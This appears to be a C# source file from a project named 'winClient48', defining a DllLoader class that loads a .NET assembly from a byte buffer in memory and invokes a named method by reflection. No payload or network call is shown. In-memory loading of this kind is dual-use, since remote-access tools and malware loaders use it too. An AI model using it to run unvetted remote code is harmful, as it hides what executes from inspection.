using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace winClient48
{
    internal class DllLoader
    {
        public DllLoader()
        {

        }

        public void Load(byte[] buffer, string name, string func, object[] param)
        {
            Assembly assembly = Assembly.Load(buffer);
            Type type = assembly.GetType(name);
            MethodInfo method = type.GetMethod(func);
            object instance = Activator.CreateInstance(type);
            method.Invoke(instance, param);
        }
    }
}
